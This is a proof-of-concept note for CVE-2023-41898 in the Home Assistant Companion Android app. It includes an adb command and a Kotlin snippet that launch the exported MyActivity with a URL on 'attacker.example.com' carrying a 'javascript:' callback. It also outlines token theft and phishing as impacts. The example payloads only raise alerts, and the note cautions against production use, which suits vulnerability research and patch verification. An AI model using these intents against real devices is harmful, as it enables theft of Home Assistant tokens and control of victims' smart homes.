# Home Assistant Companion for Android 2023.8.1 – PoC Notes

## CVE-2023-41898 – Arbitrary URL load in WebView (`MyActivity`)

**Component:** `io.homeassistant.companion.android` 2023.8.1-full  
**Activity:** `io.homeassistant.companion.android.launch.my.MyActivity` (exported)

### High-level idea
A malicious app on the same device crafts an `Intent` targeting `MyActivity` with a controlled URI as `data`. `MyActivity` appends `?mobile=1` (or similar) and loads it directly into a WebView, without adequate validation. This enables arbitrary JavaScript execution inside the Home Assistant Companion app’s WebView and can be used to steal tokens or perform actions against the user’s Home Assistant instance.

### Example PoC via `adb` (conceptual)

> Note: Package and component names are taken from the analyzed APK/manifest and public advisory examples. Exact URL parameters and behavior can vary slightly between builds, but this demonstrates the exploitation vector.

```bash
# 1. Connect your test device via USB and ensure adb works.
# 2. Install the vulnerable APK (2023.8.1-full) on the device.

# 3. Trigger the exported MyActivity with a malicious URL.
#    The URL below is only an example. In a real attack, an attacker would
#    point this to:
#      - a phishing / credential-stealing page, or
#      - a Home Assistant instance under attacker control that uses
#        the callback parameter to exfiltrate tokens.

adb shell am start \
  -n io.homeassistant.companion.android/io.homeassistant.companion.android.launch.my.MyActivity \
  -a android.intent.action.VIEW \
  -d "https://attacker.example.com/ha-exploit?callback=javascript:alert(document.domain)"
```

**What this demonstrates:**
- Another app (or `adb`) can freely invoke `MyActivity`.
- `MyActivity` will load the attacker-controlled URL into an in-app WebView.
- The attacker can control query parameters like `callback` to inject JavaScript.

### Local malicious app PoC (pseudo-code)

```kotlin
// Inside a malicious app installed on the same device
val intent = Intent(Intent.ACTION_VIEW).apply {
    component = ComponentName(
        "io.homeassistant.companion.android",
        "io.homeassistant.companion.android.launch.my.MyActivity"
    )
    data = Uri.parse("https://attacker.example.com/ha-exploit?callback=javascript:alert('pwned')")
}
startActivity(intent)
```

### Potential impact scenarios
- Steal external auth token from Home Assistant and use it to control the victim’s Home Assistant instance.
- Phishing / credential theft via trusted-looking WebView.
- Using JS bridges or callback mechanisms (if present) to reach limited native functionality from injected JavaScript.

### Notes
- This PoC assumes the environment described in the GitHub Security Lab advisory for **GHSL-2023-142 / CVE-2023-41898** and NVD.
- Exact exploit chains may require knowledge of specific WebView hooks and Home Assistant external auth flows used in the deployed backend.
- Tested behavior should be confirmed on an isolated test device; do **not** run against production systems.
